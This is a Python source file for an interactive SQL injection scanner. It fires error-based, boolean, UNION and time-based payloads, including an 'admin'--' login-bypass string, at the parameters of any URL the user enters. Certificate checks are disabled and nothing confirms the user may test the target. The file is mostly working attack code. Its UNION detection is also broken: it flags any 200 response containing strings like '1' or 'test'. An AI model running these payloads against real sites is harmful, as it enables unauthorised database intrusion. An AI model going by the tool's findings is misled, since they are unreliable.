#!/usr/bin/env python3
# app/vulnerability/sql_injection.py - SQL Injection Tester

import requests
import sys
import os
import time
from urllib.parse import urlparse, parse_qs, urlencode
from datetime import datetime

BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, BASE_DIR)

from config import C_OK, C_WARN, C_ERR, C_RESET, C_INFO, C_TITLE, REQUEST_TIMEOUT, HEADERS
from utils import Logger, pause, clear_screen, InputValidator, ReportWriter

class SQLInjectionTester:
    def __init__(self):
        self.target = None
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        
        # Error-based payloads
        self.error_payloads = [
            "'", "\"", "1'", "1\"",
            "' OR '1'='1", "\" OR \"1\"=\"1",
            "' OR 1=1--", "\" OR 1=1--",
            "admin'--", "admin\"--",
            "' UNION SELECT NULL--",
            "' AND 1=0 UNION ALL SELECT 'admin'--",
        ]
        
        # Boolean-based payloads
        self.boolean_payloads = [
            ("' AND 1=1--", "' AND 1=2--"),
            ("' OR '1'='1", "' OR '1'='2"),
            ("1' AND 'a'='a", "1' AND 'a'='b"),
        ]
        
        # Union-based payloads
        self.union_payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION ALL SELECT 'test','test','test'--",
        ]
        
        # Time-based payloads
        self.time_payloads = [
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        ]
    
    def run(self):
        """Main SQL Injection tester"""
        clear_screen()
        print(f"\n{C_TITLE}╔══════════════════════════════════════════╗")
        print(f"║       SQL INJECTION TESTER               ║")
        print(f"╚══════════════════════════════════════════╝{C_RESET}\n")
        
        print(f"{C_INFO}Example URLs for testing:{C_RESET}")
        print(f"  • http://testphp.vulnweb.com/artists.php?artist=1")
        print(f"  • http://testphp.vulnweb.com/listproducts.php?cat=1")
        print(f"  • http://example.com/product.php?id=5")
        print(f"  • http://example.com/news.php?article=10\n")
        
        print(f"{C_WARN}Note: URLs with parameters (?id=value) work best{C_RESET}\n")
        
        self.target = InputValidator.get_url()
        if not self.target:
            return
        
        Logger.info(f"Target: {self.target}")
        Logger.warning("Starting SQL Injection tests...")
        print()
        
        # Run tests
        self.test_error_based()
        self.test_boolean_based()
        self.test_union_based()
        self.test_time_based()
        
        # Results
        self.display_results()
        self.save_report()
        
        pause()
    
    def test_error_based(self):
        """Error-based SQL Injection test"""
        Logger.info("Testing Error-based SQL Injection...")
        
        try:
            parsed = urlparse(self.target)
            params = parse_qs(parsed.query)
            
            if not params:
                Logger.info("No URL parameters found, testing base URL with common parameters...")
                # Try common parameter names
                common_params = ['id', 'page', 'category', 'search', 'q', 'user', 'article']
                
                sql_errors = [
                    'sql syntax', 'mysql', 'postgresql', 'oracle', 'sqlite',
                    'syntax error', 'database error', 'warning: mysql',
                    'unclosed quotation', 'quoted string not properly terminated',
                    'ora-', 'pg_query', 'sqlite3_', 'microsoft sql server'
                ]
                
                for param in common_params:
                    for payload in self.error_payloads[:5]:
                        test_url = f"{self.target}{'&' if '?' in self.target else '?'}{param}={payload}"
                        
                        try:
                            response = self.session.get(test_url, timeout=REQUEST_TIMEOUT, verify=False)
                            
                            if any(error in response.text.lower() for error in sql_errors):
                                vuln = {
                                    'type': 'Error-based SQL Injection',
                                    'severity': 'Critical',
                                    'parameter': param,
                                    'payload': payload,
                                    'method': 'GET',
                                    'description': f'SQL error detected with parameter: {param}'
                                }
                                self.vulnerabilities.append(vuln)
                                Logger.warning(f"SQLi found! Parameter: {param}, Payload: {payload}")
                                break
                        except:
                            continue
                    
                    if self.vulnerabilities:
                        break
                
                Logger.success("Error-based test complete")
                return
            
            sql_errors = [
                'sql syntax', 'mysql', 'postgresql', 'oracle', 'sqlite',
                'syntax error', 'database error', 'warning: mysql',
                'unclosed quotation', 'quoted string not properly terminated',
                'ora-', 'pg_query', 'sqlite3_', 'microsoft sql server'
            ]
            
            for param in params.keys():
                Logger.info(f"Testing parameter: {param}")
                
                for payload in self.error_payloads:
                    test_url = self.target.replace(
                        f"{param}={params[param][0]}", 
                        f"{param}={payload}"
                    )
                    
                    try:
                        response = self.session.get(test_url, timeout=REQUEST_TIMEOUT, verify=False)
                        
                        # Check for SQL errors
                        if any(error in response.text.lower() for error in sql_errors):
                            vuln = {
                                'type': 'Error-based SQL Injection',
                                'severity': 'Critical',
                                'parameter': param,
                                'payload': payload,
                                'method': 'GET',
                                'description': f'SQL error detected in parameter: {param}'
                            }
                            self.vulnerabilities.append(vuln)
                            Logger.warning(f"SQLi found! Parameter: {param}, Payload: {payload}")
                            break
                    except Exception as e:
                        continue
            
            Logger.success("Error-based test complete")
        except Exception as e:
            Logger.error(f"Error-based test failed: {e}")
    
    def test_boolean_based(self):
        """Boolean-based blind SQL Injection test"""
        Logger.info("Testing Boolean-based SQL Injection...")
        
        try:
            parsed = urlparse(self.target)
            params = parse_qs(parsed.query)
            
            if not params:
                return
            
            for param in params.keys():
                Logger.info(f"Testing parameter: {param}")
                
                # Get baseline response
                try:
                    baseline = self.session.get(self.target, timeout=REQUEST_TIMEOUT, verify=False)
                    baseline_len = len(baseline.text)
                except:
                    continue
                
                for true_payload, false_payload in self.boolean_payloads:
                    # Test TRUE condition
                    true_url = self.target.replace(
                        f"{param}={params[param][0]}", 
                        f"{param}={true_payload}"
                    )
                    
                    # Test FALSE condition
                    false_url = self.target.replace(
                        f"{param}={params[param][0]}", 
                        f"{param}={false_payload}"
                    )
                    
                    try:
                        true_response = self.session.get(true_url, timeout=REQUEST_TIMEOUT, verify=False)
                        false_response = self.session.get(false_url, timeout=REQUEST_TIMEOUT, verify=False)
                        
                        true_len = len(true_response.text)
                        false_len = len(false_response.text)
                        
                        # If TRUE and FALSE responses differ significantly
                        if abs(true_len - false_len) > 100:
                            vuln = {
                                'type': 'Boolean-based Blind SQL Injection',
                                'severity': 'Critical',
                                'parameter': param,
                                'true_payload': true_payload,
                                'false_payload': false_payload,
                                'method': 'GET',
                                'description': f'Boolean-based SQLi in parameter: {param}'
                            }
                            self.vulnerabilities.append(vuln)
                            Logger.warning(f"Boolean SQLi found in: {param}")
                            break
                    except:
                        continue
            
            Logger.success("Boolean-based test complete")
        except Exception as e:
            Logger.error(f"Boolean-based test failed: {e}")
    
    def test_union_based(self):
        """Union-based SQL Injection test"""
        Logger.info("Testing Union-based SQL Injection...")
        
        try:
            parsed = urlparse(self.target)
            params = parse_qs(parsed.query)
            
            if not params:
                return
            
            for param in params.keys():
                Logger.info(f"Testing parameter: {param}")
                
                for payload in self.union_payloads:
                    test_url = self.target.replace(
                        f"{param}={params[param][0]}", 
                        f"{param}={payload}"
                    )
                    
                    try:
                        response = self.session.get(test_url, timeout=REQUEST_TIMEOUT, verify=False)
                        
                        # Check for successful UNION
                        union_indicators = ['test', 'null', 'select', '1', '2', '3']
                        
                        if response.status_code == 200 and any(ind in response.text.lower() for ind in union_indicators):
                            vuln = {
                                'type': 'Union-based SQL Injection',
                                'severity': 'Critical',
                                'parameter': param,
                                'payload': payload,
                                'method': 'GET',
                                'description': f'UNION-based SQLi in parameter: {param}'
                            }
                            self.vulnerabilities.append(vuln)
                            Logger.warning(f"UNION SQLi found in: {param}")
                            break
                    except:
                        continue
            
            Logger.success("Union-based test complete")
        except Exception as e:
            Logger.error(f"Union-based test failed: {e}")
    
    def test_time_based(self):
        """Time-based blind SQL Injection test"""
        Logger.info("Testing Time-based SQL Injection (may take time)...")
        
        try:
            parsed = urlparse(self.target)
            params = parse_qs(parsed.query)
            
            if not params:
                return
            
            for param in params.keys():
                Logger.info(f"Testing parameter: {param}")
                
                # Get baseline time
                try:
                    start = time.time()
                    self.session.get(self.target, timeout=REQUEST_TIMEOUT, verify=False)
                    baseline_time = time.time() - start
                except:
                    continue
                
                for payload in self.time_payloads:
                    test_url = self.target.replace(
                        f"{param}={params[param][0]}", 
                        f"{param}={payload}"
                    )
                    
                    try:
                        start = time.time()
                        self.session.get(test_url, timeout=10, verify=False)
                        response_time = time.time() - start
                        
                        # If response delayed by ~5 seconds
                        if response_time > baseline_time + 4:
                            vuln = {
                                'type': 'Time-based Blind SQL Injection',
                                'severity': 'Critical',
                                'parameter': param,
                                'payload': payload,
                                'delay': f"{response_time:.2f}s",
                                'method': 'GET',
                                'description': f'Time-based SQLi in parameter: {param}'
                            }
                            self.vulnerabilities.append(vuln)
                            Logger.warning(f"Time-based SQLi found in: {param}")
                            break
                    except:
                        continue
            
            Logger.success("Time-based test complete")
        except Exception as e:
            Logger.error(f"Time-based test failed: {e}")
    
    def display_results(self):
        """Display test results"""
        print(f"\n{C_TITLE}{'='*60}")
        print(f"SQL INJECTION TEST RESULTS")
        print(f"{'='*60}{C_RESET}\n")
        
        if not self.vulnerabilities:
            Logger.success("No SQL Injection vulnerabilities found!")
            return
        
        print(f"{C_ERR}Total vulnerabilities found: {len(self.vulnerabilities)}{C_RESET}\n")
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            print(f"{C_ERR}[{i}] {vuln['type']}{C_RESET}")
            print(f"  Parameter: {vuln['parameter']}")
            print(f"  Payload: {vuln.get('payload', 'N/A')}")
            print(f"  Severity: {vuln['severity']}")
            print(f"  Description: {vuln['description']}")
            print()
    
    def save_report(self):
        """Save test report"""
        if not self.vulnerabilities:
            return
        
        timestamp = ReportWriter.get_timestamp()
        filename = f"sqli_test_{timestamp}"
        
        report_data = {
            'target': self.target,
            'scan_date': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'total_vulnerabilities': len(self.vulnerabilities),
            'vulnerabilities': self.vulnerabilities
        }
        
        # Save JSON
        ReportWriter.save_json(filename, report_data, subfolder='vulnerability/sql_injection')
        
        # Save TXT
        txt_content = ReportWriter.create_report_header("SQL INJECTION TEST REPORT", self.target)
        txt_content += f"Total Vulnerabilities: {len(self.vulnerabilities)}\n\n"
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            txt_content += f"[{i}] {vuln['type']}\n"
            txt_content += f"Severity: {vuln['severity']}\n"
            txt_content += f"Parameter: {vuln['parameter']}\n"
            txt_content += f"Payload: {vuln.get('payload', 'N/A')}\n"
            txt_content += f"Description: {vuln['description']}\n"
            txt_content += "\n"
        
        ReportWriter.save_txt(filename, txt_content, subfolder='vulnerability/sql_injection')

if __name__ == "__main__":
    tester = SQLInjectionTester()
    tester.run()